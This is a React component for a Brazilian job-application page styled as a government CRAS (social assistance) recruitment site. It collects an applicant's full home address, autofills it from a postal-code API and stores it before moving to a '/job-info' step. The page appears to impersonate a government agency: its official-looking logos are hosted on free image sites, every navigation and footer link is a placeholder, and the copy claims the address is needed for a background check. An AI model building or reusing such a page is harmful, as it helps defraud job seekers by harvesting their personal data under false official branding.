import React, { useState, useEffect } from 'react';
import { MapPin, ArrowRight, Users, Facebook, Instagram } from 'lucide-react';

const AddressPage: React.FC = () => {
  const [formData, setFormData] = useState({
    zipCode: '',
    address: '',
    number: '',
    complement: '',
    neighborhood: '',
    city: '',
    state: ''
  });

  useEffect(() => {
    // Check if there's a saved CEP from /local page
    const savedCep = localStorage.getItem('userCep');
    if (savedCep && savedCep.length === 8) {
      console.log('CEP encontrado no localStorage:', savedCep);
      // Format and set the CEP
      const formattedCep = savedCep.slice(0, 5) + '-' + savedCep.slice(5, 8);
      setFormData(prev => ({ ...prev, zipCode: formattedCep }));
      // Auto-fill address immediately
      fetchAddressByCep(savedCep);
      // Remove from localStorage after use
      localStorage.removeItem('userCep');
    }
  }, []);

  const fetchAddressByCep = async (cep: string) => {
    const apiUrl = `https://viacep.com.br/ws/${cep}/json/`;
    console.log('Buscando endereço para CEP:', cep);
    
    try {
      const response = await fetch(apiUrl);
      const data = await response.json();
      
      if (!data.erro) {
        console.log('Endereço encontrado:', data);
        setFormData(prev => ({
          ...prev,
          address: data.logradouro || '',
          neighborhood: data.bairro || '',
          city: data.localidade || '',
          state: data.uf || ''
        }));
        // Save the auto-filled data
        saveAddressData({
          ...formData,
          address: data.logradouro || '',
          neighborhood: data.bairro || '',
          city: data.localidade || '',
          state: data.uf || ''
        });
      } else {
        console.log('CEP não encontrado');
      }
    } catch (error) {
      console.error('Erro ao buscar CEP:', error);
    }
  };

  const saveAddressData = (data = formData) => {
    localStorage.setItem('candidateCity', data.city);
    localStorage.setItem('candidateState', data.state);
    localStorage.setItem('candidateZipCode', data.zipCode);
    localStorage.setItem('candidateAddress', data.address);
    localStorage.setItem('candidateNeighborhood', data.neighborhood);
    localStorage.setItem('candidateNumber', data.number);
    localStorage.setItem('candidateComplement', data.complement);
  };

  const handleZipCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 8) {
      value = value.replace(/(\d{5})(\d{3})/, (match, p1, p2) => {
        if (p2) return `${p1}-${p2}`;
        return p1;
      });
      
      setFormData(prev => ({ ...prev, zipCode: value }));

      // Se o CEP estiver completo (8 dígitos), busca o endereço
      if (value.replace(/\D/g, '').length === 8) {
        const cepSemPontuacao = value.replace(/\D/g, '');
        fetchAddressByCep(cepSemPontuacao);
      }
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    
    // Save data when fields change
    const newData = { ...formData, [name]: value };
    saveAddressData(newData);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Save all address data to localStorage
    saveAddressData();
    
    // Navigate to job info page
    window.history.pushState({}, '', '/job-info');
    window.location.reload();
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="mb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">Processo Seletivo Assistente Social</h1>
            <p className="text-gray-700 mb-2">Sistema de Cadastro para Processo Seletivo do CRAS</p>
            <div className="h-1 w-32 bg-[#1451B4]"></div>
          </div>

          <div className="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
            <div className="flex items-start space-x-4 mb-6">
              <div className="flex-shrink-0">
                <MapPin className="text-2xl text-[#1451B4]" size={32} />
              </div>
              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-2">Endereço Residencial</h2>
                <p className="text-gray-700 text-sm">
                  Informe seu endereço residencial completo. Essas informações são necessárias para o processo de verificação de antecedentes e análise de perfil para a vaga de Assistente Social do CRAS.
                </p>
              </div>
            </div>

            <form className="space-y-6 max-w-2xl mx-auto" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="zipCode" className="block text-sm font-medium text-black">CEP *</label>
                <input 
                  type="text" 
                  id="zipCode" 
                  name="zipCode" 
                  required 
                  maxLength={9}
                  value={formData.zipCode}
                  onChange={handleZipCodeChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  placeholder="00000-000"
                />
              </div>

              <div>
                <label htmlFor="address" className="block text-sm font-medium text-black">Endereço *</label>
                <input 
                  type="text" 
                  id="address" 
                  name="address" 
                  required 
                  value={formData.address}
                  onChange={handleInputChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="number" className="block text-sm font-medium text-black">Número *</label>
                  <input 
                    type="text" 
                    id="number" 
                    name="number" 
                    required 
                    value={formData.number}
                    onChange={handleInputChange}
                    className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  />
                </div>
                <div>
                  <label htmlFor="complement" className="block text-sm font-medium text-black">Complemento</label>
                  <input 
                    type="text" 
                    id="complement" 
                    name="complement" 
                    value={formData.complement}
                    onChange={handleInputChange}
                    className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  />
                </div>
              </div>

              <div>
                <label htmlFor="neighborhood" className="block text-sm font-medium text-black">Bairro *</label>
                <input 
                  type="text" 
                  id="neighborhood" 
                  name="neighborhood" 
                  required 
                  value={formData.neighborhood}
                  onChange={handleInputChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="city" className="block text-sm font-medium text-black">Cidade *</label>
                  <input 
                    type="text" 
                    id="city" 
                    name="city" 
                    required 
                    value={formData.city}
                    onChange={handleInputChange}
                    className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  />
                </div>
                <div>
                  <label htmlFor="state" className="block text-sm font-medium text-black">Estado *</label>
                  <select 
                    id="state" 
                    name="state" 
                    required 
                    value={formData.state}
                    onChange={handleInputChange}
                    className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  >
                    <option value="">Selecione...</option>
                    <option value="AC">Acre</option>
                    <option value="AL">Alagoas</option>
                    <option value="AP">Amapá</option>
                    <option value="AM">Amazonas</option>
                    <option value="BA">Bahia</option>
                    <option value="CE">Ceará</option>
                    <option value="DF">Distrito Federal</option>
                    <option value="ES">Espírito Santo</option>
                    <option value="GO">Goiás</option>
                    <option value="MA">Maranhão</option>
                    <option value="MT">Mato Grosso</option>
                    <option value="MS">Mato Grosso do Sul</option>
                    <option value="MG">Minas Gerais</option>
                    <option value="PA">Pará</option>
                    <option value="PB">Paraíba</option>
                    <option value="PR">Paraná</option>
                    <option value="PE">Pernambuco</option>
                    <option value="PI">Piauí</option>
                    <option value="RJ">Rio de Janeiro</option>
                    <option value="RN">Rio Grande do Norte</option>
                    <option value="RS">Rio Grande do Sul</option>
                    <option value="RO">Rondônia</option>
                    <option value="RR">Roraima</option>
                    <option value="SC">Santa Catarina</option>
                    <option value="SP">São Paulo</option>
                    <option value="SE">Sergipe</option>
                    <option value="TO">Tocantins</option>
                  </select>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-md border border-gray-200">
                <h3 className="text-sm font-medium text-gray-900 mb-2">Termo de Responsabilidade</h3>
                <p className="text-sm text-gray-700">
                  Declaro que todas as informações de endereço fornecidas são verdadeiras e correspondem ao meu local de residência atual. Entendo que essas informações serão utilizadas para verificação de antecedentes e análise de perfil no processo seletivo do CRAS.
                </p>
              </div>

              <div>
                <button 
                  type="submit" 
                  className="w-full flex justify-center items-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#1451B4] hover:bg-[#0c3d8a] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#1451B4] transition-colors duration-200"
                >
                  <ArrowRight className="mr-2" size={16} />
                  Continuar Processo
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default AddressPage;